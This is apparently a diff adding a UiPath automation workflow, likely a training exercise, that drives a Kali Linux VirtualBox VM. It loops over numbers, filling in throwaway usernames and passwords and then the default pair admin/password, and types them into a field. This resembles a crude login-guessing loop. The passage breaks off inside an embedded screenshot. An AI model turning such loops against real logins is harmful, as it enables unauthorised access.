@@ -1,0 +1,296 @@
+<Activity mc:Ignorable="sap sap2010" x:Class="Main" sap2010:ExpressionActivityEditor.ExpressionActivityEditor="C#" sap:VirtualizedContainerService.HintSize="1178,2742" sap2010:WorkflowViewState.IdRef="ActivityBuilder_1" xmlns="http://schemas.microsoft.com/netfx/2009/xaml/activities" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:sap="http://schemas.microsoft.com/netfx/2009/xaml/activities/presentation" xmlns:sap2010="http://schemas.microsoft.com/netfx/2010/xaml/activities/presentation" xmlns:sc="clr-namespace:System.Collections;assembly=System.Private.CoreLib" xmlns:scg="clr-namespace:System.Collections.Generic;assembly=System.Private.CoreLib" xmlns:sco="clr-namespace:System.Collections.ObjectModel;assembly=System.Private.CoreLib" xmlns:ui="http://schemas.uipath.com/workflow/activities" xmlns:uix="http://schemas.uipath.com/workflow/activities/uix" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
+  <TextExpression.NamespacesForImplementation>
+    <sco:Collection x:TypeArguments="x:String">
+      <x:String>System.Activities</x:String>
+      <x:String>System.Activities.Statements</x:String>
+      <x:String>System.Activities.Expressions</x:String>
+      <x:String>System.Activities.Validation</x:String>
+      <x:String>System.Activities.XamlIntegration</x:String>
+      <x:String>Microsoft.VisualBasic</x:String>
+      <x:String>Microsoft.VisualBasic.Activities</x:String>
+      <x:String>System</x:String>
+      <x:String>System.Collections</x:String>
+      <x:String>System.Collections.Generic</x:String>
+      <x:String>System.Collections.ObjectModel</x:String>
+      <x:String>System.Data</x:String>
+      <x:String>System.Diagnostics</x:String>
+      <x:String>System.Drawing</x:String>
+      <x:String>System.IO</x:String>
+      <x:String>System.Linq</x:String>
+      <x:String>System.Net.Mail</x:String>
+      <x:String>System.Xml</x:String>
+      <x:String>System.Text</x:String>
+      <x:String>System.Xml.Linq</x:String>
+      <x:String>UiPath.Core</x:String>
+      <x:String>UiPath.Core.Activities</x:String>
+      <x:String>System.Windows.Markup</x:String>
+      <x:String>GlobalVariablesNamespace</x:String>
+      <x:String>GlobalConstantsNamespace</x:String>
+      <x:String>System.Runtime.Serialization</x:String>
+      <x:String>UiPath.UIAutomationNext.Enums</x:String>
+      <x:String>UiPath.UIAutomationCore.Contracts</x:String>
+      <x:String>UiPath.UIAutomationNext.Activities</x:String>
+      <x:String>UiPath.Shared.Activities</x:String>
+      <x:String>UiPath.Platform.ObjectLibrary</x:String>
+      <x:String>System.Security</x:String>
+      <x:String>System.ComponentModel</x:String>
+      <x:String>UiPath.UIAutomationNext.Contracts</x:String>
+      <x:String>UiPath.UIAutomationNext.Models.CV</x:String>
+      <x:String>System.Reflection</x:String>
+      <x:String>UiPath.UIAutomationNext.Activities.Models</x:String>
+    </sco:Collection>
+  </TextExpression.NamespacesForImplementation>
+  <TextExpression.ReferencesForImplementation>
+    <sco:Collection x:TypeArguments="AssemblyReference">
+      <AssemblyReference>Microsoft.CSharp</AssemblyReference>
+      <AssemblyReference>Microsoft.VisualBasic</AssemblyReference>
+      <AssemblyReference>mscorlib</AssemblyReference>
+      <AssemblyReference>PresentationCore</AssemblyReference>
+      <AssemblyReference>PresentationFramework</AssemblyReference>
+      <AssemblyReference>System</AssemblyReference>
+      <AssemblyReference>System.Activities</AssemblyReference>
+      <AssemblyReference>System.ComponentModel.TypeConverter</AssemblyReference>
+      <AssemblyReference>System.Core</AssemblyReference>
+      <AssemblyReference>System.Data</AssemblyReference>
+      <AssemblyReference>System.Data.Common</AssemblyReference>
+      <AssemblyReference>System.Data.DataSetExtensions</AssemblyReference>
+      <AssemblyReference>System.Drawing</AssemblyReference>
+      <AssemblyReference>System.Drawing.Common</AssemblyReference>
+      <AssemblyReference>System.Drawing.Primitives</AssemblyReference>
+      <AssemblyReference>System.Linq</AssemblyReference>
+      <AssemblyReference>System.ObjectModel</AssemblyReference>
+      <AssemblyReference>System.Private.CoreLib</AssemblyReference>
+      <AssemblyReference>System.Runtime.Serialization</AssemblyReference>
+      <AssemblyReference>System.ServiceModel</AssemblyReference>
+      <AssemblyReference>System.ServiceModel.Activities</AssemblyReference>
+      <AssemblyReference>System.Xaml</AssemblyReference>
+      <AssemblyReference>System.Xml</AssemblyReference>
+      <AssemblyReference>System.Xml.Linq</AssemblyReference>
+      <AssemblyReference>UiPath.System.Activities</AssemblyReference>
+      <AssemblyReference>UiPath.UiAutomation.Activities</AssemblyReference>
+      <AssemblyReference>WindowsBase</AssemblyReference>
+      <AssemblyReference>UiPath.Studio.Constants</AssemblyReference>
+      <AssemblyReference>System.Private.ServiceModel</AssemblyReference>
+      <AssemblyReference>System.Runtime.Serialization.Formatters</AssemblyReference>
+      <AssemblyReference>System.Private.DataContractSerialization</AssemblyReference>
+      <AssemblyReference>System.Runtime.Serialization.Primitives</AssemblyReference>
+      <AssemblyReference>UiPath.UIAutomationNext</AssemblyReference>
+      <AssemblyReference>UiPath.UIAutomationCore</AssemblyReference>
+      <AssemblyReference>UiPath.UIAutomationNext.Activities</AssemblyReference>
+      <AssemblyReference>UiPath.Excel.Activities</AssemblyReference>
+      <AssemblyReference>UiPath.Mail.Activities</AssemblyReference>
+      <AssemblyReference>UiPath.Testing.Activities</AssemblyReference>
+      <AssemblyReference>UiPath.OCR.Activities</AssemblyReference>
+      <AssemblyReference>UiPath.Platform</AssemblyReference>
+      <AssemblyReference>System.Security.Permissions</AssemblyReference>
+      <AssemblyReference>System.Runtime.InteropServices</AssemblyReference>
+      <AssemblyReference>System.ComponentModel.EventBasedAsync</AssemblyReference>
+      <AssemblyReference>Microsoft.Win32.Primitives</AssemblyReference>
+      <AssemblyReference>System.ComponentModel</AssemblyReference>
+      <AssemblyReference>System.ComponentModel.Primitives</AssemblyReference>
+      <AssemblyReference>ejercicio.Core</AssemblyReference>
+      <AssemblyReference>NPOI</AssemblyReference>
+      <AssemblyReference>UiPath.Excel.Activities.Design</AssemblyReference>
+      <AssemblyReference>System.Memory.Data</AssemblyReference>
+      <AssemblyReference>System.Console</AssemblyReference>
+      <AssemblyReference>System.Configuration.ConfigurationManager</AssemblyReference>
+      <AssemblyReference>System.Memory</AssemblyReference>
+      <AssemblyReference>System.Private.Uri</AssemblyReference>
+      <AssemblyReference>System.Reflection.DispatchProxy</AssemblyReference>
+      <AssemblyReference>System.Reflection.TypeExtensions</AssemblyReference>
+      <AssemblyReference>System.Reflection.Metadata</AssemblyReference>
+      <AssemblyReference>UiPath.Workflow</AssemblyReference>
+      <AssemblyReference>System.Linq.Expressions</AssemblyReference>
+      <AssemblyReference>System.Linq.Parallel</AssemblyReference>
+      <AssemblyReference>System.Collections.Immutable</AssemblyReference>
+      <AssemblyReference>System.Linq.Queryable</AssemblyReference>
+    </sco:Collection>
+  </TextExpression.ReferencesForImplementation>
+  <Sequence DisplayName="Main Sequence" sap:VirtualizedContainerService.HintSize="1188,2677" sap2010:WorkflowViewState.IdRef="Sequence_1">
+    <Sequence.Variables>
+      <Variable x:TypeArguments="x:String" Name="strUserName" />
+      <Variable x:TypeArguments="x:String" Name="strPassword" />
+    </Sequence.Variables>
+    <sap:WorkflowViewStateService.ViewState>
+      <scg:Dictionary x:TypeArguments="x:String, x:Object">
+        <x:Boolean x:Key="IsExpanded">True</x:Boolean>
+      </scg:Dictionary>
+    </sap:WorkflowViewStateService.ViewState>
+    <uix:NApplicationCard AttachMode="ByInstance" DisplayName="Utilizar Aplicación: kali-linux-2023.3-virtualbox-amd64 [Corriendo] - Oracle VM VirtualBox" sap:VirtualizedContainerService.HintSize="1126,2566" sap2010:WorkflowViewState.IdRef="NApplicationCard_1" IsCVEnabled="False" ScopeGuid="c32c08a6-40fa-4d09-8567-957d778cda6b" Version="V2">
+      <uix:NApplicationCard.Body>
+        <ActivityAction x:TypeArguments="x:Object">
+          <ActivityAction.Argument>
+            <DelegateInArgument x:TypeArguments="x:Object" Name="WSSessionData" />
+          </ActivityAction.Argument>
+          <Sequence DisplayName="Hacer" sap:VirtualizedContainerService.HintSize="1092,2275" sap2010:WorkflowViewState.IdRef="Sequence_2">
+            <sap:WorkflowViewStateService.ViewState>
+              <scg:Dictionary x:TypeArguments="x:String, x:Object">
+                <x:Boolean x:Key="IsExpanded">True</x:Boolean>
+              </scg:Dictionary>
+            </sap:WorkflowViewStateService.ViewState>
+            <ui:Activate DelayBefore="{x:Null}" DelayMS="{x:Null}" DisplayName="Activar 'Qt5QWindowIcon'" sap:VirtualizedContainerService.HintSize="1030,107" sap2010:WorkflowViewState.IdRef="Activate_1">
+              <ui:Activate.Target>
+                <ui:Target ClippingRegion="{x:Null}" Element="{x:Null}" Id="5005b84a-1722-4fdb-b3c5-e4ed72619595" InformativeScreenshot="8aed03bd3a63aa61131eb29e93f63942" Selector="&lt;wnd cls='Qt*QWindowIcon' idx='8' title='VirtualBoxVM' /&gt;">
+                  <ui:Target.TimeoutMS>
+                    <InArgument x:TypeArguments="x:Int32" />
+                  </ui:Target.TimeoutMS>
+                  <ui:Target.WaitForReady>
+                    <InArgument x:TypeArguments="ui:WaitForReady" />
+                  </ui:Target.WaitForReady>
+                </ui:Target>
+              </ui:Activate.Target>
+              <sap:WorkflowViewStateService.ViewState>
+                <scg:Dictionary x:TypeArguments="x:String, x:Object">
+                  <x:Boolean x:Key="IsExpanded">True</x:Boolean>
+                  <x:Boolean x:Key="IsPinned">False</x:Boolean>
+                </scg:Dictionary>
+              </sap:WorkflowViewStateService.ViewState>
+            </ui:Activate>
+            <ui:ForEach x:TypeArguments="x:Int32" CurrentIndex="{x:Null}" DisplayName="Para cada" sap:VirtualizedContainerService.HintSize="1030,2013" sap2010:WorkflowViewState.IdRef="ForEach`1_1">
+              <ui:ForEach.Body>
+                <ActivityAction x:TypeArguments="x:Int32">
+                  <ActivityAction.Argument>
+                    <DelegateInArgument x:TypeArguments="x:Int32" Name="currentItem" />
+                  </ActivityAction.Argument>
+                  <Sequence DisplayName="Cuerpo" sap:VirtualizedContainerService.HintSize="996,1827" sap2010:WorkflowViewState.IdRef="Sequence_3">
+                    <Sequence.Variables>
+                      <Variable x:TypeArguments="x:String" Name="strObtenerTexto" />
+                    </Sequence.Variables>
+                    <sap:WorkflowViewStateService.ViewState>
+                      <scg:Dictionary x:TypeArguments="x:String, x:Object">
+                        <x:Boolean x:Key="IsExpanded">True</x:Boolean>
+                      </scg:Dictionary>
+                    </sap:WorkflowViewStateService.ViewState>
+                    <WriteLine DisplayName="Escribir línea" sap:VirtualizedContainerService.HintSize="954,90" sap2010:WorkflowViewState.IdRef="WriteLine_1">
+                      <InArgument x:TypeArguments="x:String">
+                        <CSharpValue x:TypeArguments="x:String" sap2010:WorkflowViewState.IdRef="CSharpValue`1_13">currentItem.ToString()</CSharpValue>
+                      </InArgument>
+                    </WriteLine>
+                    <If DisplayName="Si" sap:VirtualizedContainerService.HintSize="954,766" sap2010:WorkflowViewState.IdRef="If_1">
+                      <If.Condition>
+                        <InArgument x:TypeArguments="x:Boolean">
+                          <CSharpValue x:TypeArguments="x:Boolean" sap2010:WorkflowViewState.IdRef="CSharpValue`1_8">currentItem &lt;= 2</CSharpValue>
+                        </InArgument>
+                      </If.Condition>
+                      <If.Then>
+                        <Sequence sap:VirtualizedContainerService.HintSize="476,292" sap2010:WorkflowViewState.IdRef="Sequence_4">
+                          <sap:WorkflowViewStateService.ViewState>
+                            <scg:Dictionary x:TypeArguments="x:String, x:Object">
+                              <x:Boolean x:Key="IsExpanded">True</x:Boolean>
+                            </scg:Dictionary>
+                          </sap:WorkflowViewStateService.ViewState>
+                          <Assign DisplayName="Asignar" sap:VirtualizedContainerService.HintSize="434,82" sap2010:WorkflowViewState.IdRef="Assign_3">
+                            <Assign.To>
+                              <OutArgument x:TypeArguments="x:String">
+                                <CSharpReference x:TypeArguments="x:String" sap2010:WorkflowViewState.IdRef="CSharpReference`1_4">strUserName</CSharpReference>
+                              </OutArgument>
+                            </Assign.To>
+                            <Assign.Value>
+                              <InArgument x:TypeArguments="x:String">
+                                <CSharpValue x:TypeArguments="x:String" sap2010:WorkflowViewState.IdRef="CSharpValue`1_4">"fdghfdsgkh" + currentItem</CSharpValue>
+                              </InArgument>
+                            </Assign.Value>
+                          </Assign>
+                          <Assign DisplayName="Asignar" sap:VirtualizedContainerService.HintSize="434,82" sap2010:WorkflowViewState.IdRef="Assign_4">
+                            <Assign.To>
+                              <OutArgument x:TypeArguments="x:String">
+                                <CSharpReference x:TypeArguments="x:String" sap2010:WorkflowViewState.IdRef="CSharpReference`1_5">strPassword</CSharpReference>
+                              </OutArgument>
+                            </Assign.To>
+                            <Assign.Value>
+                              <InArgument x:TypeArguments="x:String">
+                                <CSharpValue x:TypeArguments="x:String" sap2010:WorkflowViewState.IdRef="CSharpValue`1_5">"hola" + currentItem</CSharpValue>
+                              </InArgument>
+                            </Assign.Value>
+                          </Assign>
+                        </Sequence>
+                      </If.Then>
+                      <If.Else>
+                        <Sequence sap:VirtualizedContainerService.HintSize="476,292" sap2010:WorkflowViewState.IdRef="Sequence_5">
+                          <sap:WorkflowViewStateService.ViewState>
+                            <scg:Dictionary x:TypeArguments="x:String, x:Object">
+                              <x:Boolean x:Key="IsExpanded">True</x:Boolean>
+                            </scg:Dictionary>
+                          </sap:WorkflowViewStateService.ViewState>
+                          <Assign DisplayName="Asignar" sap:VirtualizedContainerService.HintSize="434,82" sap2010:WorkflowViewState.IdRef="Assign_5">
+                            <Assign.To>
+                              <OutArgument x:TypeArguments="x:String">
+                                <CSharpReference x:TypeArguments="x:String" sap2010:WorkflowViewState.IdRef="CSharpReference`1_6">strUserName</CSharpReference>
+                              </OutArgument>
+                            </Assign.To>
+                            <Assign.Value>
+                              <InArgument x:TypeArguments="x:String">admin</InArgument>
+                            </Assign.Value>
+                          </Assign>
+                          <Assign DisplayName="Asignar" sap:VirtualizedContainerService.HintSize="434,82" sap2010:WorkflowViewState.IdRef="Assign_6">
+                            <Assign.To>
+                              <OutArgument x:TypeArguments="x:String">
+                                <CSharpReference x:TypeArguments="x:String" sap2010:WorkflowViewState.IdRef="CSharpReference`1_7">strPassword</CSharpReference>
+                              </OutArgument>
+                            </Assign.To>
+                            <Assign.Value>
+                              <InArgument x:TypeArguments="x:String">password</InArgument>
+                            </Assign.Value>
+                          </Assign>
+                        </Sequence>
+                      </If.Else>
+                    </If>
+                    <uix:NTypeInto ActivateBefore="True" ClickBeforeMode="Single" DisplayName="Escribir en 'virtualboxvm.exe kali-l…'" EmptyFieldMode="SingleLine" sap:VirtualizedContainerService.HintSize="954,218" sap2010:WorkflowViewState.IdRef="NTypeInto_4" ScopeIdentifier="c32c08a6-40fa-4d09-8567-957d778cda6b" Version="V3">
+                      <uix:NTypeInto.Target>
+                        <uix:TargetAnchorable Accuracy="0.5" DesignTimeRectangle="327, 135, 645, 23" DesignTimeScaleFactor="1" FriendlyName="'virtualboxvm.exe kali-l…'" Guid="ffc74a24-1c47-4923-a267-fe2ad910676f" ImageBase64="iVBORw0KGgoAAAANSUhEUgAAAoUAAAAXCAYAAAB9GDW1AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAACDcSURBVHhe7X33cyTneeb9N4tFTjMABjlnzCAvcloAiwWInHPGADMIA0yOAJe0S7yjrqwrna3TiXUmj7Is31kyrURbR1M+khJN0jS5Irmkf3ju/bp7Bj2DnoBdcgkee6ueqp3+OrzfG58vdOM/3IpOhQwZMmTIkCFDhoxvN2RSKEOGDBkyZMiQIUMmhTJkyJAhQ4YMGTJkUihDhgwZMmTIkCGDIJNCGTJkyJAhQ4YMGTIplCFDhgwZMmTIkCGTQhkyZMiQIUOGDBmEbyUpjErtworzFAMFSsn2W/F3MOe0YrQ8SPtTgRIFwybYl9uRGCPVfg3E5OLOxjl0A+W4LdX+NBGBLFEp9ehfXEVveSai6Hd06TROXevQxEu3B17PQ4nMlkUsTXZCFSvV/niIrVmCxTyPcpIlUK6bBLGcUu0yniK+lPj7avxZhhJZd4/h3OpDypPm2W8BbnLOY4gtHMDM0gSq0xSS7TcXNye+g5BCFXK7DvCdn72PD//LJOLEbfHl6Dn+Af7unYd49Om/4c2fvoiV+rwQxZlBgWTNGp599Q28/+kj/PHd3+C/mcaQlyB1LkMmCgfP8MJfvobfvvtHfPJv7+BXL/8JpquzJc6VRkKDFa99+jleXim6Ilts9QLMoQrmTSCFMUXo3DvHdmdhGN1GgG8aKczsw5rNgZWWfGlSGNB+KyYDKdklSE0UJ4J0lI6ZYT+ZRFGc99iTQon84TMfUf9KE6RknyLFpZyKrAZ0jG1i78QGu8sN07EW421VTz7QkBE5vpT4e3x/jlKo0T1/iFO7B9YzHSbbKhAvcd63EzIpvA6kc146VPVTWD92wOG0Q786hsr0wNqZhtJJO5yUk74631MgqW4FRrse3XlfZu1+GrI/bnxnomHVg+XGTP53TD7adxyYrkkPOC9yXCGFafUrcLz8Fh5+8Dr+7o1P8NCPFGajxfGP+PS9n8A43gt18yR0P3wbX3zwMhaLghvhduEa/vt7n+L17+6ip6ENHQt/ip9//Aj/6O5HksT5UXm7eOnNn+JiexadTa1o6N/Fn/7iIf79/76A7tSr51+Boh/O33yIh59IkUIl8u4bYQs1A3cDSGFUSgeWHSFmM6+DbxgpDERY8hVXjwmz64kCISLEFKJjlxH1Akmy+qXiSfokkjOudBDP9HejsqQCWflqaPp3cOZxYFaT9eSDDRmR4euMv5gc1C85cDTdhszUHKhqpqB1nmKw8OvLbTcLMim8DqRyXnTBGHTWffSW5CMxrQqtK1ZYlzuQ7KfPp0GsvircZNmfAikcfu4V/Cf9OMoUKnQ+/wd8JCKFtwv38ONP3sOL9/Mur0nugfP//DveejDgP6Pogwodz72DRz8/RZnPkRTIXnoFDz/9CVbzpZJTGmIDCm1MjQW//OJdPN8TprNUEPu/8wZ+fbELx68+vUoKAwq737Ve3ABSGFM5D+OXtfwnk8IvBYyoL4mI+k0lhYFy+iG2BD0HFzi6X4XowDYZXw2+zviLb8S01YghLwmMq8DAkQcL9RlXz/1WQiaF18HVnKdERo8e9tUOJAjnxDVswH74DHL8ZrxkUvjV4CmQwkukB5BCBTKWXsWnv/+P6EoSn5eGauM/4PM3PKiXKo4JvXD/7hF+sl3pnxDT5/HnH32GH83l+58fDKlL+OFnH+CF/lDJTInsib/Am6/ZUa9oxsmvPrtKCpPbsWj3L5hRKdVom9qDzuiG3WrC1sw69t08KbydMwyt24h74pnQmGzUr7ihH9JAPeeEa7P3MqFQAWhaccF+NC6aBmazk2ewrXQgMa4Q1QPL2Dyk0ZTrWTgpYa+PtUPlpzs6/55BmM1UoZqeYV/tRJIoaUUXjuPItoG6VAXiGrfgNEygwPc8BRQd+3Ae3Ecm258gUZRYcJ8czKG9fwXbBgfsTjsO1yahzhQ7E1sWmMSy1gSr04XTgw301xQihmtjyfQIZ9M9qL2/iX3SnXV7gPoRpn+cLBc4XZvH7J6Z7uvGqW4Ho3fKEe/tXwApv5KIxO2MPFmew8Wzzwu4wHwd64NEso/LR+XAKrbZMofdCt3aFGpzvP6kQFLpIKZ3jTDaL+ByOnC8O4bSROFaAiPqJtMlUefkch9idmwHerMHDssZdhaGUZ7m9ZUgOkqowuDxOVaas3z3vhVXh1GTBzNqkj1on9i5oWzCI1BOMaKURBitTiw0ZCEqLowc7HdCCWpHtrF/5oTDfQGr8QRzLSU+P4pSaNA5sw+9yQ2H2YjNyV7kpQhL3pyt3Vjqakbvgh4nNjd0Q9WIJvvNWrUY6hjH4j7vA0bdOvoq8oT7KpBY1IuRlUMcWzxwuT04219FV1mOEMtMr9Q2fx8901ocWdxw2s3YGu9AVroa7SyWmTxkj9WRFqSL9RDCB1isH3i8Og+AZw+tSupXJPEbm4vSPoqrIzu3nHa4sYTl44vL+OP6v4/7nRNYOrDQfc5h0m+gp7wQqrpxLO2bYGG23V9Ge7F3RjfAnznd2rE0cBcj6yc445aG9ZjprPFfAeEGF3aMV5I9Y7NR2LsLk3kdtawv3nMYOJn20N88jLk9er7DCYN2Hf1V+cLgIZxNKB7SG3F38RAnXDvZ9GgbXV4yGsyP4tQYNjyLg/6yy/qQ2IRJI91/uvmyCHsH8138dpqopAo0jW1Da6D72Sw42JhFU77qUhaW3/STqG+ZxdqhnfL6Ohq4PqchXTOGBYofi9MDk24Ts5tWuAS9RuQDgu4Xerpwb+UYBpsHlhMdZnrUvhwdlVaHrskdHJxSbmX9NRxgsq3yMsfFZCKvdQ4bnB9dUB/M2BtvQSpn22BtKlRdt95w98tBYecC1nV0P6cTJ/tbGKovRix3LoHlU9s++uoGMLljJNtbMV7Nx0RcbgdG1o5xSn20Gg8xv6AjmcSkUAFl5wGcO/1Io2fFZrZh/MiFg8Eqv5wUEbEKJyeB1er26T0+31B8b04OY0xrDlIrhDwxdw9dU1ocUo5m9X1zogtZwraciOwdgezh/JHpKT6vC8+s8/5iPSV/6Z/ChnVNJOs14ptrf1Zabi8uXJisTvPJGCmuQQrT0ez+Z3z2V7vI9jqkgPjh7+Pjz36E8RT/4wxRGev4H5/9AQ+6vEVNACUr/WuP8Lq5NcB5pJF090W88/AVLOQEJDMRoku28NJbP4NOo6L7S5PC6Io5GMUFM6YIrRtOWHbHUVdcClV+PVqnDXBcCKSD2jt2L3A0dDmzws3E2I7Rl6dEvGYFVgcl2WRxG5FLp4hIxhajR+vB6p1cRMVSUekZQktdHfJyylCgGcGa5QLaPlFSJLbftn05mxlXvQCjYxP13mLLgn7oFJaFFiSQLR6XFJ567Ngc7kJpXjEyClowtEvFde+esNGVSJJ6CafmXfRWl0GRVojC5gXonQYMFjJb8k7sPndCOz2I2go1CvOoqIfrn+DMbsM6uqoroMqphnqAChXJMlcnFBgx6fPKGowUkhzRyVRErG7M1mUhLjEDMZz8AUEWrULRCOlsbxKaggKkZFRAM3II29k8KmiQE5XShnmrA+v99chKy4UyT41KdTWfpNkz6X45gzxR946IObnOXdh9pgNFOSXIrujFpN5Deh8RRslBdBSWjAXrUzib8M8MlNOHhAr07LpgWu6Ekt0vAjlyBk7gPFpEfWEhUtNLkFd5B6XZApGOK0P3ngu66U4UZuZDkduIvk07LMsdQnHjbe1xnmK+vwMVJTXIy6D7cvZ7FqerI6gtKUN6VjXqJwxE7DbRKJCV+OJu9HV1ooraM/Pr0Ewx6bSsoCaZtQt6tR1irK0eOVlFyFGPYtv2AG6zDqOt9cjNKkauZpyOXWC7u1jw+9A+cCsuE4rMIqRLIhfxTGdh4zcduf1HcBh30KuuhCq7CtW96zB4HviRQr7/w9CUlCI9W407c0a4PW4crfDHMnI0aJk3wW1aRAU3MJEqGkQYjoiYqaugyixFSfsqTiiOJmuEWQMGIhjVs2ST3TUs6GwwbE5A47WfGJxMD+i8KTRVlFNcatA0eQy76xA9uXwchrQJkbbWTRrgLd5FUVYeUjIrUKJuQA6Xs0L5URqKRi1wbd+FUoi12OpFGphRDrVQ34V951HKbqw5D9GdxXJyIZrWHLDsjKO2iHJ2IQ06Vq1wWzdQL7xgwGKT6dy4M4NWjQZFlNsZYYuvmMER5ea5TpItuwyF9aNkP/Ibr14j8QFvDiMbDzSokZ1djvKOFRy5XFht4XN2lLIObXfvor66Ctk5VajoWseJ24yRUj5OY8pnYXAc4r6mHEplPrKKG6EuLeT8I1TbtesN85tePWzGbfSoWb6toQGqFmaPGeNVwoBDsL3rdBuDLY0oKqlCBtk0StmCOSJfBxPdKKH8llXehRGtC+duMSlkxGoIWnr+ypwWJ6ZjzHSpkczlKzHCEasI5KR+tW25g9dqOucqKeTzxHh7I/IoT2RVD2HN/ABHwzQ4ZfeMxN7hZI/AH6OUVF/MoXT5mPEtzBQuNRLn4WQp4GYKp57OTGEGer7zPh69tIrUgHNju1/AHx69ioUMXgFi3C7U4aeP3oS9OYCxxpRj/a8e4XeeXr+RgCQSmqH72z/id88PIVmqnSGhCXt//Xu8ulPPk0xGCn8dSAr55ORX2NmMm5NGBGLZ/UgHEaz2PRqJjSGPK/Q0Ym7YgHV/iCdPya2Yt5GhqnkjJNStwrg6iA4avekHKzjHi0rrw4adniH5RpQSBSMmONe7Lkf4SeRANtFsZrwGo2duLDRk833hloDsmFbzzvHYpNBvxEfJiBFm1zaaWCInR2/fOYe293JWiDlg3bIHh0OV1C/BifcGke6VWxIB/ZOQhStcMza4hNGmv/4lZA1ol15q9Q+yqBQ2Q2zC/RKRH8bXYdxkx0RlGiW2+9h3G3CvUKJgMhBRb93y33YgpcPonHvYdQkzM8F0FMkMnVSfwtqEnXNVTv7aTJSPG2HVjqGQI1Z0LKwc6aiZpxHqSidSryR5NiM5B5N1GVWi2dTo/DEiqTSAYUVLSGxXlqoD7ceQSD7vdAdd9ohK6cKKi+xXzK4JSKDcOWkoGbfCudopmilLF47xS1vhfMB37FoI8O+ERkyaHZgnMu/TP9PDpsjnJfrP5Qjq3xDXP/GxM2HpV6poBMYRs/0FTkaEgke4rWzA4K4d7osHOB6v4waR3vv7QcomRPr7dOx+an/7CfCzSZwGI0ZGwIskzg3jR+UzOHNuCYNestmYGdsDdzFpInkqeH+Ir1uDVTeCbLo+umiCy9kt6aJ8mkh+e0bkvJcfAPCxuY0GgTxxiMlBIxVQw1itqOZI+VIYSOme6iOT26UV6oL4fAYiNN3aC+xxsatAStseXMYFVPoG+l6EaiNct94kNGDSEuiPOahddMJBPsvt++Ns76B7inMfvyzsZDr31RWm15mAnJeB7NZVsscDeNgzM0X+44cwxCoCOaOLJ3ESslZ77R6EaHHX8INmF9XvDCk7SSK07OH9UQlV72EYXT5efLNVy6Y1DxYbBNtRjejYYf7xuPnsmjOFLRdv4dFfHyA3QJmx976HDz/5IUbFASggKnMLLz/6F/xJb0CxjdVg/+eP8GvjHcmE40NMHtpcr+PhP72APgnSySMT9cZf4O2XNi+JEZFCQyAppHu1bHpEBZMCsHUPTn3A/ocAR4tSUvKzn6Cf7X+MyULtkoPuIbwVzH4vunDMGSoDVTNWrLXkIamRiCORsqxYIpGNm7DuDPhGwrdTK1DbO4WZlT3sHJzg2HoB90aPz3GjKUme+i3/sc/TnMG62MYl9ej8UeiN875R9JdFCm/nDuPARUHHZmuIHIybn4Pb6YLVdgm7m4oL19fgyTRk/yQTKvmQegU2C/WZ9SFkoF9tj4QUcmTF8wAOUV+sNMJ2egQiEleEpmUa3bls0C7PovdOHTLEb/4mtlAyNvhtO5DS4a3YUm7PHu8fQXT0uKQwrE3oHAk5OdBAY8FBBKNYlCzCyqFAQvkEtI4HsB3vYfr+ANQFuUK8KqAkH3OfX8AmksVqO4fb7R1YSNv6iv0YiFQ8YzwXLZNnIL2yFwNT61jdOcT+oRX2cytGStk10sk+6DHB98L6gFeWMAjl39xylGsfreICEagHqf4HPWaR7rOkbtOhXvDgbEzD2yi2CO3bTujG6pFZPQMd3Wv+TjE/aKbrNRNbGKwQBppSz6dnFo8JRJv7Hcom6cjr2YfF48Hp7iqGeztQmO7VaSg/IhAxHzOyfVBUI+JqcP/4ED05NIiZssIwyghpOiro//ohRnqC5Gwq3OVTDtjmmrj+ScYm52OB+ymDxGgoBMthmlXYbUuo5OSiPuc0o314EYubOmh1ZzTgfgDt3VLumqi0FkyekN9YT7AyNYrWmjIkCnU1VNt16w2f0wP8kRBP5zhOp1AokW95MF9ywzRRd2knQqBe42lgeGrZRmt+BVrW7bDtj6MklX9WTP4QFhZ6oOL0EZpYhZdTgVQiy+Fqtb98UrYV/EcYYPjuExKhZI/EH/m4DK3Lx4hvBvKHpnUihV6fZqSQBoGTVU+FFCqQvfFTPHrvz9Dvt0xMCtP/PR69bodaHIBeJAziud9/jv99oPYLoFup4/ju+3/En0/m+p/vh0xUbr2K9z78G2hrxVOm/rhdzGYjEeLfI/zXcRVXMOf8CiYjT1oyqD+DvxIkxMbZiGW/vwzRbJnRQsTJ57wsCFlADiMrsR7jp/yIgZ/W16M7S8Ut3+wKsztRyfUYNbignehBeX4hkhIzkMuWVnykkJyj//jK8l90/jPQW1ehTmYjnROckGN4l92/NFLIFTQvKazBMI10dmjk7yPVfpBOpmH7FyShxqiXYTXNoZT1IWSgX22PhBTezh6C1u2ddfGeE4AYFdJK29E5vIKts3Mara+iThiIRJfNwBCwT09Kh9yLHPvn2Oxgn8uR1pGYjPl0GxEpDGcTaTkZohQdmNYtolZI2BwikYMQrShHVdsIRldOuKK/N1BDyVGBpJYduKwLqAx4lg9BbC1ZhPxIIY2sO/ZgOdtEb50aqrRMxCYSqXU9GSkM5wOR7C8K598sTnUurf+qQKAepPof9Njjk8Io1QC2nXu4o2CyKKFQz0HvtGGtuwrKmkUYHCRnpiCn1PPpmqJRMxxcMQxnE/78hOx6NPVNY37fBpfrFKNVoj2Hkn7E2njSxwhgLBF33cEIkRsiWVXzMJ5QXksgonhyJswSB8nZXBG2wzrTyPVdMjbJt8fMHvKx4KQw8j2FUjmMBrbs5UCSK6boGezbTjHT1YQ8tgyZUMDN4HtJIXdNfD7y6+5iYHoXR/YHsGzcRZa3T0HbrldvJP2REE/3sJ+M8zVD0vYZqF06h3G8NgSRIZ1PO2DwkpTECnRu2OHQz6I6swydu24YxusEG4eZbQsrp1DTwtRqf/mkcoI/KXzyPYWR+GMGNIvhdHnN+Obav/Y9hdSJcgN+9vmH+P6E6Nt5Cc04+eXneMPRFWQZOAeD330fX/zSimrfdwkVUI79BT74+C8xm+3vBJdQoXTpR3j7o1/CLmwulj6PEKtCsjIPqWkiZPTC+g+f4cc7GijScpFIimdGCCyYbMnU5DpEd44oICSCJJ5Ii3F/GEUNazCudYmcjJJvaieWbVp0NMzgaLufnxEkBl+34sJ2bzdGT4/QK9w/unwWRucaND5dKJF9hTS5ry7/sRmofTtmKCH306jzfvGlsWPr1uCwLfvp94lJITcidcNJI07paXapgIu0f+fQkyyXAZKOwhEjHGvd/DkhA/1qOyNQ42Y3ZkVE5op88YzsPIB